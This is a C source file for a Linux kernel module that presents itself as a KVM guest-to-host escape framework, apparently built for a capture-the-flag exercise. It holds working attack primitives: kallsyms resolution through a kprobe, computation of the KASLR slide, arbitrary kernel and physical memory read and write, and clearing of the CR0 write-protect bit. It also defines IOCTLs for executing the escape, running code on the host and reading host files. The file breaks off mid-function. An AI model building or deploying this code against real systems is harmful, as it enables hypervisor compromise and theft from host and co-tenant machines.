/*
 * KVM Probe Driver - Complete Guest-to-Host Escape Framework
 * Builds KVM exploitation primitives for VM escape and flag capture
 *
 * Step 1: Symbol Operations (Complete)
 * Step 2: Memory Read Operations (Complete)
 * Step 3: Memory Write Operations (Complete)
 * Step 4: Address Conversion (Complete)
 * Step 5: KVM Structure Discovery (Complete)
 * Step 6: Escape Primitives (Complete)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/kvm_para.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <linux/vmalloc.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/anon_inodes.h>
#include <asm/io.h>

/* x86-specific includes */
#ifdef CONFIG_X86
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include <asm/msr.h>
#include <asm/vmx.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define MAX_READ_SIZE (4 * 1024 * 1024)  /* 4MB max */
#define MAX_WRITE_SIZE (1024 * 1024)      /* 1MB max */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Exploitation Framework");
MODULE_DESCRIPTION("Complete KVM guest-to-host escape framework");
MODULE_VERSION("3.0");

/* ========================================================================
 * Global Variables
 * ======================================================================== */
static int major_num = -1;
static struct class *driver_class = NULL;
static struct device *driver_device = NULL;

/* KASLR Tracking */
static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static bool g_kaslr_initialized = false;

/* KVM Structure Tracking */
static unsigned long g_kvm_base = 0;
static unsigned long g_vcpu_base = 0;
static unsigned long g_vmcs_base = 0;
static unsigned long g_ept_pointer = 0;

/* ========================================================================
 * Symbol Database - KVM Functions for Escape
 * ======================================================================== */

typedef struct {
    const char *name;
    unsigned long address;
    const char *description;
} kvm_symbol_t;

/* Pre-populated with provided symbols from JSON files */
static kvm_symbol_t kvm_symbols[] = {
    /* KVM Hypercalls */
    {"kvm_sev_hc_page_enc_status", 0, "SEV page encryption status"},
    {"kvm_guest_apic_eoi_write", 0, "Guest APIC EOI write"},

    /* Memory Operations */
    {"kvm_read_and_reset_apf_flags", 0, "Read/reset async page fault flags"},
    {"kvm_sched_clock_read", 0, "KVM sched clock read"},
    {"kvm_disable_host_haltpoll", 0, "Disable host haltpoll"},
    {"kvm_enable_host_haltpoll", 0, "Enable host haltpoll"},

    /* Guest Memory Access - CRITICAL for guest-to-host escape */
    {"kvm_vcpu_gfn_to_hva", 0, "GFN to HVA translation"},
    {"kvm_vcpu_gfn_to_pfn_atomic", 0, "Atomic GFN to PFN"},
    {"kvm_vcpu_gfn_to_pfn", 0, "GFN to PFN"},
    {"kvm_release_page_clean", 0, "Release clean page"},
    {"kvm_release_pfn_clean", 0, "Release clean PFN"},
    {"kvm_release_page_dirty", 0, "Release dirty page"},
    {"kvm_release_pfn_dirty", 0, "Release dirty PFN"},
    {"kvm_set_pfn_dirty", 0, "Mark PFN dirty"},
    {"kvm_set_pfn_accessed", 0, "Mark PFN accessed"},
    {"kvm_read_guest_page", 0, "Read guest page"},
    {"kvm_vcpu_read_guest_page", 0, "VCPU read guest page"},
    {"kvm_read_guest", 0, "Read guest memory"},
    {"kvm_vcpu_read_guest", 0, "VCPU read guest"},
    {"kvm_vcpu_read_guest_atomic", 0, "Atomic VCPU read guest"},
    {"kvm_write_guest_page", 0, "Write guest page"},
    {"kvm_vcpu_write_guest_page", 0, "VCPU write guest page"},
    {"kvm_write_guest", 0, "Write guest memory"},
    {"kvm_vcpu_write_guest", 0, "VCPU write guest"},
    {"kvm_gfn_to_hva_cache_init", 0, "Initialize GFN to HVA cache"},
    {"kvm_write_guest_offset_cached", 0, "Write to cached guest offset"},
    {"kvm_write_guest_cached", 0, "Write cached guest memory"},
    {"kvm_read_guest_offset_cached", 0, "Read cached guest offset"},
    {"kvm_read_guest_cached", 0, "Read cached guest memory"},
    {"kvm_vcpu_mark_page_dirty", 0, "Mark guest page dirty"},

    /* Address Translation Functions */
    {"gfn_to_hva", 0, "GFN to HVA translation"},
    {"gfn_to_hva_memslot", 0, "GFN to HVA via memslot"},
    {"gfn_to_hva_prot", 0, "GFN to HVA with protection"},
    {"gfn_to_pfn", 0, "GFN to PFN translation"},
    {"gfn_to_page", 0, "GFN to page struct"},
    {"__gfn_to_page", 0, "Internal GFN to page"},
    {"gpa_to_gfn", 0, "GPA to GFN conversion"},
    {"gfn_to_gpa", 0, "GFN to GPA conversion"},
    {"hva_to_gfn_memslot", 0, "HVA to GFN via memslot"},
    {"hva_to_pfn", 0, "HVA to PFN translation"},
    {"spte_to_pfn", 0, "SPTE to PFN extraction"},
    {"pfn_to_hpa", 0, "PFN to HPA conversion"},

    /* Memory Slot Operations */
    {"kvm_memslots", 0, "Get KVM memslots"},
    {"__kvm_memslots", 0, "Internal get memslots"},
    {"kvm_get_memslot", 0, "Get specific memslot"},
    {"gfn_to_memslot", 0, "GFN to memslot lookup"},
    {"__gfn_to_memslot", 0, "Internal GFN to memslot"},
    {"kvm_vcpu_gfn_to_memslot", 0, "VCPU GFN to memslot"},
    {"kvm_arch_memslots_updated", 0, "Memslots updated callback"},
    
    /* GPC (GFN to PFN Cache) - Critical for fast translation */
    {"kvm_gpc_init", 0, "Initialize GFN to PFN cache"},
    {"kvm_gpc_activate", 0, "Activate GFN to PFN cache"},
    {"kvm_gpc_activate_hva", 0, "Activate GPC for HVA"},
    {"kvm_gpc_check", 0, "Check GPC validity"},
    {"kvm_gpc_refresh", 0, "Refresh GPC"},
    {"kvm_gpc_deactivate", 0, "Deactivate GPC"},

    /* I/O Operations */
    {"kvm_io_bus_write", 0, "KVM I/O bus write"},
    {"kvm_io_bus_read", 0, "KVM I/O bus read"},
    {"kvm_fast_pio", 0, "Fast PIO emulation"},
    {"kvm_sev_es_mmio_write", 0, "SEV-ES MMIO write"},
    {"kvm_sev_es_mmio_read", 0, "SEV-ES MMIO read"},
    {"kvm_coalesced_mmio_init", 0, "Coalesced MMIO init"},

    /* Page Fault Handlers */
    {"kvm_inject_emulated_page_fault", 0, "Inject emulated page fault"},
    {"kvm_inject_page_fault", 0, "Inject page fault"},
    {"kvm_handle_page_fault", 0, "Handle page fault"},
    {"kvm_mmu_page_fault", 0, "MMU page fault"},
    {"kvm_tdp_page_fault", 0, "TDP page fault"},
    {"kvm_mmu_gva_to_gpa_read", 0, "MMU GVA to GPA (read)"},
    {"kvm_mmu_gva_to_gpa_write", 0, "MMU GVA to GPA (write)"},
    {"kvm_read_guest_virt", 0, "Read guest virtual memory"},
    {"kvm_write_guest_virt_system", 0, "Write guest virtual memory (system)"},

    /* MMU Operations - Key for exploitation */
    {"kvm_mmu_set_mmio_spte_mask", 0, "Set MMIO SPTE mask"},
    {"kvm_mmu_alloc_shadow_page", 0, "Allocate shadow page"},
    {"kvm_mmu_free_shadow_page", 0, "Free shadow page"},
    {"kvm_mmu_get_shadow_page", 0, "Get shadow page"},
    {"kvm_mmu_find_shadow_page", 0, "Find shadow page"},
    {"kvm_mmu_sync_roots", 0, "Sync MMU roots"},
    {"kvm_mmu_free_roots", 0, "Free MMU roots"},
    {"kvm_mmu_get_guest_pgd", 0, "Get guest PGD"},
    {"kvm_mmu_hugepage_adjust", 0, "Hugepage adjustment"},
    {"kvm_mmu_unprotect_gfn_and_retry", 0, "Unprotect GFN and retry"},
    {"kvm_mmu_slot_remove_write_access", 0, "Remove write access from slot"},
    {"kvm_mmu_slot_gfn_write_protect", 0, "Write protect slot GFN"},
    {"kvm_mmu_write_protect_fault", 0, "Write protect fault"},
    {"kvm_mmu_track_write", 0, "Track write"},
    {"kvm_mmu_invalidate_begin", 0, "Invalidate begin"},
    {"kvm_mmu_invalidate_end", 0, "Invalidate end"},
    {"kvm_mmu_invalidate_range_add", 0, "Invalidate range add"},
    {"kvm_mmu_unmap_gfn_range", 0, "Unmap GFN range"},

    /* Shadow Page Table Operations */
    {"mmu_set_spte", 0, "Set SPTE"},
    {"kvm_mmu_set_spte", 0, "KVM set SPTE"},
    {"make_spte", 0, "Make SPTE"},
    {"link_shadow_page", 0, "Link shadow page"},
    {"account_shadowed", 0, "Account shadowed page"},

    /* EPT Operations */
    {"ept_gva_to_gpa", 0, "EPT GVA to GPA"},
    {"handle_ept_violation", 0, "Handle EPT violation"},
    {"handle_ept_misconfig", 0, "Handle EPT misconfig"},
    {"vmx_flush_pml_buffer", 0, "Flush PML buffer"},

    /* VCPU Operations */
    {"kvm_arch_vcpu_ioctl_run", 0, "VCPU ioctl run"},
    {"vmx_vcpu_run", 0, "VMX VCPU run"},
    {"svm_vcpu_run", 0, "SVM VCPU run"},
    {"kvm_emulate_instruction", 0, "Emulate instruction"},
    {"kvm_vcpu_kick", 0, "VCPU kick"},
    {"kvm_vcpu_block", 0, "VCPU block"},
    {"kvm_vcpu_halt", 0, "VCPU halt"},
    
    /* Register Operations */
    {"kvm_register_read", 0, "Read VCPU register"},
    {"kvm_register_write", 0, "Write VCPU register"},
    {"kvm_rip_read", 0, "Read RIP"},
    {"kvm_rip_write", 0, "Write RIP"},
    {"kvm_rsp_read", 0, "Read RSP"},
    {"kvm_rax_read", 0, "Read RAX"},
    {"kvm_rbx_read", 0, "Read RBX"},
    {"kvm_rcx_read", 0, "Read RCX"},
    {"kvm_rdx_read", 0, "Read RDX"},
    {"kvm_rsi_read", 0, "Read RSI"},
    {"kvm_rdi_read", 0, "Read RDI"},
    {"kvm_r8_read", 0, "Read R8"},
    {"kvm_read_cr0", 0, "Read CR0"},
    {"kvm_read_cr3", 0, "Read CR3"},
    {"kvm_read_cr4", 0, "Read CR4"},

    /* VMCS Operations */
    {"vmcs_read32", 0, "Read VMCS 32-bit"},
    {"vmcs_read64", 0, "Read VMCS 64-bit"},
    {"vmcs_write32", 0, "Write VMCS 32-bit"},
    {"vmcs_write64", 0, "Write VMCS 64-bit"},
    {"vmcs_set_bits", 0, "Set VMCS bits"},
    {"vmcs_clear_bits", 0, "Clear VMCS bits"},

    /* Hypercall Related */
    {"kvm_hv_hypercall", 0, "Hyper-V hypercall"},
    {"kvm_hv_send_ipi", 0, "Hyper-V send IPI"},
    {"kvm_hvcall_signal_event", 0, "HV signal event"},

    /* APIC Operations */
    {"kvm_lapic_readable_reg_mask", 0, "LAPIC readable register mask"},
    {"kvm_apic_write_nodecode", 0, "APIC write no decode"},
    {"kvm_alloc_apic_access_page", 0, "Allocate APIC access page"},

    /* Hyper-V */
    {"kvm_hv_assist_page_enabled", 0, "Hyper-V assist page enabled"},
    {"kvm_hv_get_assist_page", 0, "Get Hyper-V assist page"},

    /* TDP (Two-Dimensional Paging) */
    {"kvm_tdp_mmu_read_spte", 0, "TDP read SPTE"},
    {"kvm_tdp_map_page", 0, "TDP map page"},
    
    /* Page Track */
    {"kvm_page_track_init", 0, "Page track init"},
    {"kvm_page_track_cleanup", 0, "Page track cleanup"},
    {"__kvm_page_track_write", 0, "Page track write"},
    {"kvm_gfn_is_write_tracked", 0, "GFN is write tracked"},
    {"__kvm_write_track_add_gfn", 0, "Add GFN to write track"},
    {"__kvm_write_track_remove_gfn", 0, "Remove GFN from write track"},

    /* Exported Symbols from kvm_main.c */
    {"kvm_get_kvm", 0, "Get KVM reference"},
    {"kvm_put_kvm", 0, "Put KVM reference"},
    {"kvm_get_running_vcpu", 0, "Get running VCPU"},
    {"kvm_get_kvm_safe", 0, "Get KVM reference safe"},
    
    /* NULL terminator */
    {NULL, 0, NULL}
};

static unsigned int kvm_symbol_count = 0;

/* VMX Exit Handlers - Critical for understanding VM exits */
static struct {
    const char *name;
    unsigned long address;
} vmx_handlers[] = {
    {"handle_exception_nmi", 0},
    {"handle_external_interrupt", 0},
    {"handle_triple_fault", 0},
    {"handle_nmi_window", 0},
    {"handle_io", 0},
    {"handle_cr", 0},
    {"handle_dr", 0},
    {"handle_cpuid", 0},
    {"handle_rdmsr", 0},
    {"handle_wrmsr", 0},
    {"handle_interrupt_window", 0},
    {"handle_halt", 0},
    {"handle_invlpg", 0},
    {"handle_vmcall", 0},
    {"handle_invd", 0},
    {"handle_xsetbv", 0},
    {"handle_apic_access", 0},
    {"handle_apic_eoi_induced", 0},
    {"handle_apic_write", 0},
    {"handle_ept_violation", 0},
    {"handle_ept_misconfig", 0},
    {"handle_pause", 0},
    {"handle_monitor_trap", 0},
    {"handle_invpcid", 0},
    {"handle_pml_full", 0},
    {"handle_preemption_timer", 0},
    {"handle_vmx_instruction", 0},
    {"handle_encls", 0},
    {"handle_bus_lock_vmexit", 0},
    {"handle_notify", 0},
    {"handle_rdmsr_imm", 0},
    {"handle_wrmsr_imm", 0},
    {"__vmx_handle_exit", 0},
    {"handle_task_switch", 0},
    {"handle_tpr_below_threshold", 0},
    {"handle_invalid_guest_state", 0},
    {NULL, 0}
};

/* SVM Exit Handlers */
static struct {
    const char *name;
    unsigned long address;
} svm_handlers[] = {
    {"svm_handle_invalid_exit", 0},
    {"svm_handle_exit", 0},
    {NULL, 0}
};

/* ========================================================================
 * Kallsyms Lookup
 * ======================================================================== */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *) = NULL;

static int kallsyms_lookup_init(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    kallsyms_lookup_name_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_ptr ? 0 : -ENOENT;
}

static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name_ptr ? kallsyms_lookup_name_ptr(name) : 0;
}
#else
static int kallsyms_lookup_init(void) { return 0; }
static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

/* ========================================================================
 * Data Structures
 * ======================================================================== */

/* Symbol lookup request */
struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

/* KVM handler info */
struct handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char type[32];
};

/* Kernel memory read request */
struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

/* Physical memory read request */
struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

/* Guest memory read request */
struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

/* Memory write requests */
struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int use_pfn;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

/* Memory pattern search */
struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[64];
    size_t pattern_len;
    unsigned long found_addr;
    int region_type;
};

/* Memory region scan */
struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char __user *buffer;
    size_t buffer_size;
    int region_type;
};

/* MSR operations */
struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

/* CR operations */
struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

/* Memset request */
struct memset_request {
    unsigned long addr;
    unsigned char value;
    size_t length;
    int addr_type;
};

/* Page table dump */
struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    int status;
};

/* KASLR info */
struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

/* Address conversion */
struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

/* GPA to HVA conversion */
struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

/* GFN to HVA conversion */
struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

/* GFN to PFN conversion */
struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

/* HVA to PFN conversion */
struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

/* Virtual to Physical conversion */
struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

/* Physical to Virtual conversion */
struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

/* SPTE to PFN extraction */
struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

/* EPT walk request */
struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

/* GVA translation request */
struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

/* KVM VM Info - for escape */
struct kvm_vm_info {
    unsigned long kvm_base;
    unsigned long vcpu_base;
    unsigned long vmcs_base;
    unsigned long ept_pointer;
    unsigned long memslots_base;
    int num_memslots;
    int num_vcpus;
    int status;
};

/* Memory slot info */
struct memslot_info {
    unsigned long base_gfn;
    unsigned long npages;
    unsigned long userspace_addr;
    unsigned long flags;
    int slot_id;
    int status;
};

/* Escape state */
struct escape_state {
    int stage;
    unsigned long target_addr;
    unsigned long host_rip;
    unsigned long host_rsp;
    unsigned long host_cr3;
    unsigned long flag_addr;
    char flag_data[256];
    int status;
};

/* Flag capture request */
struct flag_capture_request {
    char flag_path[256];
    char flag_data[256];
    unsigned long flag_addr;
    int capture_method;
    int status;
};

/* ========================================================================
 * IOCTL Definitions
 * ======================================================================== */

#define IOCTL_BASE 0x4000

/* Symbol operations (Step 1) */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)

/* Memory read operations (Step 2) */
#define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM         (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION     (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN    (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER       (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR               (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES       (IOCTL_BASE + 0x17)
#define IOCTL_READ_EPT_POINTERS      (IOCTL_BASE + 0x18)
#define IOCTL_READ_GUEST_REGISTERS   (IOCTL_BASE + 0x19)
#define IOCTL_GET_KASLR_INFO         (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PHYS_PAGE         (IOCTL_BASE + 0x1B)
#define IOCTL_READ_PFN_DATA          (IOCTL_BASE + 0x1C)

/* Memory write operations (Step 3) */
#define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM        (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR              (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER      (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL          (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL        (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM        (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES            (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN     (IOCTL_BASE + 0x29)

/* Address conversion operations (Step 4) */
#define IOCTL_GPA_TO_HVA             (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA             (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN             (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN             (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA             (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN             (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN             (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA             (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT           (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN            (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN            (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE            (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN            (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA          (IOCTL_BASE + 0x3F)

/* KVM structure discovery (Step 5) */
#define IOCTL_GET_KVM_INFO           (IOCTL_BASE + 0x40)
#define IOCTL_GET_VCPU_INFO          (IOCTL_BASE + 0x41)
#define IOCTL_GET_MEMSLOT_INFO       (IOCTL_BASE + 0x42)
#define IOCTL_FIND_KVM_STRUCTURES    (IOCTL_BASE + 0x43)
#define IOCTL_SCAN_FOR_KVM           (IOCTL_BASE + 0x44)
#define IOCTL_READ_VMCS_FIELD        (IOCTL_BASE + 0x45)
#define IOCTL_WRITE_VMCS_FIELD       (IOCTL_BASE + 0x46)

/* Escape primitives (Step 6) */
#define IOCTL_PREPARE_ESCAPE         (IOCTL_BASE + 0x50)
#define IOCTL_EXECUTE_ESCAPE         (IOCTL_BASE + 0x51)
#define IOCTL_CAPTURE_FLAG           (IOCTL_BASE + 0x52)
#define IOCTL_READ_HOST_FILE         (IOCTL_BASE + 0x53)
#define IOCTL_WRITE_HOST_MEMORY      (IOCTL_BASE + 0x54)
#define IOCTL_GET_ESCAPE_STATUS      (IOCTL_BASE + 0x55)
#define IOCTL_TRIGGER_VMEXIT         (IOCTL_BASE + 0x56)
#define IOCTL_HOST_CODE_EXEC         (IOCTL_BASE + 0x57)

/* ========================================================================
 * KASLR Handling
 * ======================================================================== */

static int init_kaslr(void)
{
    unsigned long stext_addr;

    stext_addr = lookup_kernel_symbol("_stext");
    if (!stext_addr) {
        stext_addr = lookup_kernel_symbol("_text");
    }
    if (!stext_addr) {
        stext_addr = lookup_kernel_symbol("startup_64");
    }

    if (!stext_addr) {
        printk(KERN_WARNING "%s: Could not find kernel text symbol for KASLR\n", DRIVER_NAME);
        return -ENOENT;
    }

    g_kernel_text_base = stext_addr;
    g_kaslr_slide = stext_addr - 0xffffffff81000000UL;
    g_kaslr_initialized = true;

    printk(KERN_INFO "%s: KASLR initialized - slide: 0x%lx, kernel text: 0x%lx\n",
           DRIVER_NAME, g_kaslr_slide, g_kernel_text_base);

    return 0;
}

static inline unsigned long apply_kaslr(unsigned long unslid_addr)
{
    if (!g_kaslr_initialized) {
        return unslid_addr;
    }

    if (unslid_addr >= 0xffffffff80000000UL && unslid_addr < 0xffffffffc0000000UL) {
        return unslid_addr + g_kaslr_slide;
    }

    return unslid_addr;
}

/* ========================================================================
 * x86 Control Register & MSR Functions
 * ======================================================================== */

#ifdef CONFIG_X86

static unsigned long read_cr0_local(void)
{
    unsigned long val;
    asm volatile("mov %%cr0, %0" : "=r"(val));
    return val;
}

static unsigned long read_cr2_local(void)
{
    unsigned long val;
    asm volatile("mov %%cr2, %0" : "=r"(val));
    return val;
}

static unsigned long read_cr3_local(void)
{
    unsigned long val;
    asm volatile("mov %%cr3, %0" : "=r"(val));
    return val;
}

static unsigned long read_cr4_local(void)
{
    unsigned long val;
    asm volatile("mov %%cr4, %0" : "=r"(val));
    return val;
}

static void write_cr0_local(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

static void write_cr4_local(unsigned long val)
{
    asm volatile("mov %0, %%cr4" : : "r"(val) : "memory");
}

static unsigned long long read_msr_safe(u32 msr)
{
    u32 low, high;
    int err;

    asm volatile("1: rdmsr\n"
                 "2:\n"
                 ".section .fixup,\"ax\"\n"
                 "3: mov %4, %0\n"
                 "   xor %1, %1\n"
                 "   xor %2, %2\n"
                 "   jmp 2b\n"
                 ".previous\n"
                 _ASM_EXTABLE(1b, 3b)
                 : "=r"(err), "=a"(low), "=d"(high)
                 : "c"(msr), "i"(-EIO), "0"(0));

    return ((unsigned long long)high << 32) | low;
}

static int write_msr_safe_local(u32 msr, u64 value)
{
    u32 low = value & 0xFFFFFFFF;
    u32 high = value >> 32;
    int err;

    asm volatile("1: wrmsr\n"
                 "2:\n"
                 ".section .fixup,\"ax\"\n"
                 "3: mov %4, %0\n"
                 "   jmp 2b\n"
                 ".previous\n"
                 _ASM_EXTABLE(1b, 3b)
                 : "=r"(err)
                 : "c"(msr), "a"(low), "d"(high), "i"(-EIO), "0"(0));

    return err;
}

#endif /* CONFIG_X86 */

/* ========================================================================
 * Memory Read Operations
 * ======================================================================== */

static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size)
{
    if (!virt_addr_valid(addr)) {
        printk(KERN_DEBUG "%s: Invalid kernel address: 0x%lx\n", DRIVER_NAME, addr);
        return -EFAULT;
    }

    if (probe_kernel_read(buffer, (void *)addr, size)) {
        return -EFAULT;
    }

    return 0;
}

static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    size_t remaining = size;
    size_t copied = 0;

    while (remaining > 0) {
        size_t chunk_size = min(remaining, (size_t)PAGE_SIZE);
        unsigned long offset = (phys_addr + copied) & ~PAGE_MASK;
        unsigned long page_phys = (phys_addr + copied) & PAGE_MASK;

        chunk_size = min(chunk_size, (size_t)(PAGE_SIZE - offset));

        mapped = ioremap(page_phys, PAGE_SIZE);
        if (!mapped) {
            printk(KERN_DEBUG "%s: Failed to ioremap 0x%lx\n", DRIVER_NAME, page_phys);
            return copied > 0 ? 0 : -EFAULT;
        }

        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);

        copied += chunk_size;
        remaining -= chunk_size;
    }

    return 0;
}

static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy;
    size_t copied = 0;

    while (copied < size) {
        if (!pfn_valid(pfn)) {
            printk(KERN_DEBUG "%s: Invalid PFN: 0x%lx\n", DRIVER_NAME, pfn);
            return copied > 0 ? 0 : -EINVAL;
        }

        page = pfn_to_page(pfn);
        if (!page) {
            return copied > 0 ? 0 : -EFAULT;
        }

        kaddr = kmap_atomic(page);
        if (!kaddr) {
            return copied > 0 ? 0 : -ENOMEM;
        }

        to_copy = min(size - copied, (size_t)(PAGE_SIZE - offset));
        memcpy(buffer + copied, kaddr + offset, to_copy);
        kunmap_atomic(kaddr);

        copied += to_copy;
        pfn++;
        offset = 0;
    }

    return 0;
}

/* ========================================================================
 * Memory Write Operations
 * ======================================================================== */

static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
                                size_t size, int disable_wp)
{
    unsigned long cr0_orig = 0;

    if (!virt_addr_valid(addr)) {
        return -EFAULT;
    }

#ifdef CONFIG_X86
    if (disable_wp) {
        cr0_orig = read_cr0_local();
        write_cr0_local(cr0_orig & ~0x10000UL);  /* Clear WP bit */
    }
#endif

    if (probe_kernel_write((void *)addr, buffer, size)) {
#ifdef CONFIG_X86
        if (disable_wp) {
            write_cr0_local(cr0_orig);
        }
#endif
        return -EFAULT;
    }

#ifdef CONFIG_X86
    if (disable_wp) {
        write_cr0_local(cr0_orig);
    }
#endif

    return 0;
}

static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    size_t remaining = size;
    size_t written = 0;

    while (remaining > 0) {
        size_t chunk_size = min(remaining, (size_t)PAGE_SIZE);
        unsigned long offset = (phys_addr + written) & ~PAGE_MASK;
        unsigned long page_phys = (phys_addr + written) & PAGE_MASK;

